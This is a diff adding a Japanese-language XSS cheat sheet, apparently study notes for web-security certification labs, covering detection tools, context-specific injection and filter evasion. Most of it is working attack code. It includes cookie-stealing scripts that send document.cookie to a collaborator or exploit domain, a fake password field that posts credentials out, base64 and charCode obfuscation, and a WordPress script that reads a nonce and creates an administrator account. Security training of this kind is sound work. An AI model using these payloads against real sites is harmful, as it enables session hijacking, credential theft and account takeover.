@@ -1,5 +1,462 @@
 
-🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 🔗[OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
+
+- 関連ノート：[XSS](https://claude.ai/chat/XSS.md)
+- 🚨必ず一読：[URLエンコードについて](https://claude.ai/BSCP/cheatsheet/%F0%9F%94%8D%20Recon.md#%E2%AD%90%EF%B8%8FURL%E3%82%A8%E3%83%B3%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6)
+
+---
+
+# 注目ポイント
+
+- Post Comment機能
+- Search機能
+- 怪しいJavaScriptファイル
+- Check Stock機能
+- Cookieの値が `username:token` の形式
+- Remember me機能（Stay-logged-in Cookie）
+- LiveChat機能：[WebSocketの脆弱性と悪用](https://claude.ai/BSCP/Client-side/WebSockets/2.%20WebSocket%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E3%81%A8%E6%82%AA%E7%94%A8.md#%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%92%E6%82%AA%E7%94%A8%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AEWebSocket%E3%83%A1%E3%83%83%E3%82%BB%E3%83%BC%E3%82%B8%E3%81%AE%E6%93%8D%E4%BD%9C)
+
+---
+
+# Detection
+
+## XSStrike（自動検出）
+
+XSSに特化した検出ツール。手動のIntruder Scanより速い。
+
+> [!WARNING] XSSに脆弱でないものでも検知してしまうことがある（False positive）。certainの表示に注意すること。またペイロードは難解なものが生成されるため、**DetectにのみM使用し、Exploitには期待しない**こと。
+
+```zsh
+cd /path/to/XSStrike
+
+# GET
+python3 xsstrike.py -u "<URL>"
+
+# POST
+python3 xsstrike.py -u "<URL>" --data "<bodyのパラメータと値>"
+
+# HTTPヘッダも追加する場合
+python3 xsstrike.py -u "<URL>" --headers
+```
+
+## Scanner（Burp）
+
+### 反射型 XSS
+
+**Search機能：**
+
+- パラメータの値をScanする
+
+**JSファイル：**
+
+- Web cache poisoningの脆弱性も同時に検出した場合は→[🔍Web cache poisoning](https://claude.ai/BSCP/Advanced/Web%20cache%20poisoning/%F0%9F%94%8DWeb%20cache%20poisoning.md)
+
+### 持続型 XSS
+
+**Comment機能：**
+
+- Comment・Websiteのパラメータ値をScanする
+    - OAST：[XSS Comment機能の場合](https://claude.ai/chat/XSS.md#Comment%E6%A9%9F%E8%83%BD%E3%81%AE%E5%A0%B4%E5%90%88)
+
+**Cookieが `username:token` の形式の場合：**
+
+- `username` をScan selected insertion point → [XSS Cookie対応](https://claude.ai/chat/XSS.md#Cookie%E3%81%8Cusername%20token%E3%81%AE%E5%A0%B4%E5%90%88)
+
+### DOM-based XSS
+
+ScannerではDOMベースのXSSは見つからない可能性が高い。→[🔍DOM-based Vuln](https://claude.ai/BSCP/Client-side/DOM-based%20vuln/%F0%9F%94%8DDOM-based%20Vuln.md#Detect)
+
+---
+
+# Fuzz
+
+DevToolsのConsoleタブでエラーを観測しながらcontextを調整する。
+
+```html
+<script>alert(1)</script>
+```
+
+```html
+<img src=1 onerror="alert(1)">
+```
+
+```html
+<script src="data:,alert(1);//"></script>
+```
+
+---
+
+# Cookie窃取スクリプト
+
+`alert(1)` の動作確認が取れたら以下に差し替える：
+
+```js
+document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
+```
+
+```js
+fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
+```
+
+難読化が必要な場合：
+
+```js
+eval(atob("<base64エンコードした上記ペイロード>"))
+```
+
+→ [Web攻撃の難読化](https://claude.ai/OSCP/Cheatsheet/Evasion\(OSCP+%E8%A9%A6%E9%A8%93%E7%AF%84%E5%9B%B2%E5%A4%96\)/Web%E6%94%BB%E6%92%83%E3%81%AE%E9%9B%A3%E8%AA%AD%E5%8C%96.md#base64%20encoding)
+
+---
+
+# XSS Contexts（注入箇所別の手法）
+
+## HTMLタグ内への注入
+
+> [!WARNING] HTMLタグ内にXSSペイロードを注入するとき、タグは `>` だけで閉じることができる。開発者ツールで注入後のcontextを確認し、文法を維持すること。
+
+**例：**
+
+```html
+<h1>0 search results for 'ユーザの入力'</h1>
+```
+
+に対して：
+
+```
+"><body onresize=print()>"
+```
+
+### HTMLタグ内のXSSメソドロジー
+
+1. 有効なタグを割り出す。[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
+
+```http
+GET /?search=<§§> HTTP/2
+```
+
+2. 有効なイベントを割り出す。cheat sheetのCopy events to clipboardしてペースト（`%20` = 空白）
+
+```http
+GET /?search=<有効なタグ%20§§=1> HTTP/2
+```
+
+3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なペイロード候補を取得する
+    
+4. contextに合わせて改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する
+    
+
+```html
+<iframe src="https://TARGET/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+### すべてのタグが禁止されている場合
+
+custom tagを使用してエクスプロイトサーバにホストし、deliverする：
+
+```html
+<script>
+    location = 'https://TARGET/?search=<xss+id=x+onfocus=document.location=\'https://COLLABORATOR_DOMAIN/?c=\'+document.cookie tabindex=1>#x';
+</script>
+```
+
+---
+
+## HTMLタグ属性内への注入
+
+`<>` は注入できなくても引用符を注入できる場合、新たな属性を追加する。
+
+> [!WARNING] 開発者ツールで注入後のcontextを確認し、文法を維持すること。
+
+**例：**
+
+```html
+<input type="text" value="user_input_here" name="username">
+```
+
+に対して：
+
+```html
+<input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username">
+```
+
+### href属性へのJavaScript注入
+
+```html
+<a href="javascript:alert(document.cookie)">
+```
+
+リンクをクリックするとスクリプトが実行される。
+
+### headタグ内のcanonical属性へのXSS
+
+1. `<head>` タグ内に `canonical` が設定されていることを確認する
+2. クエリストリングを検索し、`<link rel="canonical" href="">` のhrefに反映されるか確認する
+
+```html
+<link rel="canonical" href='https://example/?aaa'/>
+```
+
+3. hrefへの反映を悪用してペイロードを注入する
+
+```
+http://example/?'accesskey='x'onclick='alert(1)
+```
+
+↓
+
+```html
+<link rel="canonical" href="https://example/?" accesskey="x" onclick="alert(1)">
+```
+
+---
+
+## JavaScriptへの注入
+
+### 既存スクリプトを強制終了させて任意のJSを実行する
+
+1. スクリプト内にユーザーが制御可能な値が存在する箇所を見つける
+
+```js
+<script>
+    var input = 'ここに入力';
+</script>
+```
+
+2. 既存のスクリプトを閉じさせてペイロードを注入する
+
+```js
+</script><img src=1 onerror=alert(document.cookie)>
+```
+
+### 引用符で囲まれた文字列からの脱却
+
+**基本：**
+
+```js
+'-alert(1)-'
+```
+
+```js
+';alert(1)//
+```
+
+**引用符がバックスラッシュでエスケープされるケース：**
+
+1. 引用符（`'` or `"`）を入力し、`\` でエスケープされることを確認する
+2. `\` を入力し、エスケープされない脆弱性があるか確認する
+3. ペイロードに `\` を追加して送信する
+
+```js
+\';alert(1)//'
+```
+
+### HTMLエンコードの利用
+
+引用符で囲まれた属性値にJavaScriptが存在するとき：
+
+```html
+<a href="#" onclick="... var input='ここに入力'; ...">
+```
+
+引用符をHTMLエンコードして脱却する：
+
+```js
+&apos;-alert(1)-&apos;
+```
+
+URLとして組み込む場合：
+
+```url
+http://foo?&apos;-alert(1)-&apos;
+```
+
+🔗[Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
+
+### JSテンプレートリテラルへの注入
+
+入力した内容がテンプレートリテラル（`` ` ` ``）に埋め込まれているケース。**既存のJSを終了させる必要がない**のが特徴。
+
+```js
+<script>
+    var input = `ここに入力`;
+</script>
+```
+
+`${}` でJSの式を埋め込む：
+
+```js
+${alert(1)}
+```
+
+---
+
+# OAST（帯域外通信）
+
+## Username & Password の取得
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+→ Request to collaboratorを確認する
+
+## Cookieの取得
+
+### Comment機能の場合
+
+```html
+<script>
+fetch('https://COLLABORATOR_DOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
+
+### Cookieが `username:token` の形式の場合
+
+`username` の箇所に以下を注入する：
+
+```
+'"><svg/onload=fetch(`//COLLABORATOR_DOMAIN/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
+```
+
+- `encodeURIComponent()`：URLの一部としてCookieを送るときに使用する
+
+→ Request to collaboratorを確認する
+
+---
+
+# Privilege Escalation w/ XSS & CSRF
+
+**シナリオ：**
+
+- CookieにHTTP onlyフラグが付与されていてJavaScriptで窃取できないとき
+- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき
+
+**目的：** 高権限のユーザーを作成する
+
+参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)
+
+## 手順
+
+1. ソースコードまたはFuzzingでXSSに脆弱なHTTPヘッダ等を特定する （例：Visitorsプラグインの `user-agent` が脆弱であるとする）
+    
+2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャする
+    
+3. nonceを抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成する
+    
+
+**nonce抽出：**
+
+```js
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php"; // アクション実行先のURL
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false); // falseで同期通信にしてnonceを確実に取得
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+```
+
+**抽出したnonceを使用してアクションを実行：**
+
+```js
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+```
+
+4. [JS: CharCodeAt()による難読化](https://claude.ai/Evasion\(OSCP+%E8%A9%A6%E9%A8%93%E7%AF%84%E5%9B%B2%E5%A4%96\)/Web%E6%94%BB%E6%92%83%E3%81%AE%E9%9B%A3%E8%AA%AD%E5%8C%96.md)を適用する
+    
+5. 難読化したスクリプトをBurp SuiteでXSSに脆弱な箇所（`user-agent`など）に埋め込み、ルートディレクトリへGETリクエストを送信する（`<script></script>` で囲む）
+    
+
+![](https://claude.ai/Images/Pasted%20image%2020250321200240.png)
+
+6. Visitorsプラグインを確認し、user-agentに何も記載されていなければ成功
+
+![](https://claude.ai/Images/Pasted%20image%2020250320123601.png)
+
+![](https://claude.ai/Images/Pasted%20image%2020250320123617.png)
+
+---
+
+# Misc
+
+## 難読化
+
+```js
+<img src=1 onerror=alert(1)>
+```
+
+↓
+
+```js
+<img src=1 oNeRrOr=alert`1`)
+```
+
+- `alert\`1` `：テンプレートリテラルを関数の引数として渡す形式（`alert(1)` 相当）
+- その他：🔗[XSS cheat sheet - Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation)
+
+## クエリストリングへの埋め込み
+
+```http
+/any?xss='><script>alert(1)</script>
+```
+
+## URLエンコードで実行されない場合
+
+→ Webキャッシュポイズニングを試みる：[正規化されたCache keyの悪用](https://claude.ai/BSCP/Advanced/Web%20cache%20poisoning/4.%20%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8/3.%20%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8.md#%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%95%E3%82%8C%E3%81%9FCache%20key%E3%81%AE%E6%82%AA%E7%94%A8)
+
+## 基本ペイロード早見表
+
+**Reflected XSS：**
+
+```html
+<!-- ユーザー操作不要 -->
+<iframe src="https://TARGET?<vuln_param>=<payload>">
+
+<!-- ユーザー操作が必要（iframeが禁止されているときに有効） -->
+<script>
+location = 'https://TARGET?<vuln_param>=<payload>'
+</script>
+```
+
+**Stored XSS：**
+
+```html
+<script>alert(1)</script>
+```
+
+```html
+<img src=1 onerror=alert(1)>
+```
+
+## Stay-logged-in Cookieの取得
+
+1. Comment機能の特定パラメータに以下を注入する
+
+```js
+<script>
+    document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
+</script>
+```
+
+2. エクスプロイトサーバのAccess Logを確認しCookieを入手する
+
+
+---
+---
+
 
 # Detect
 
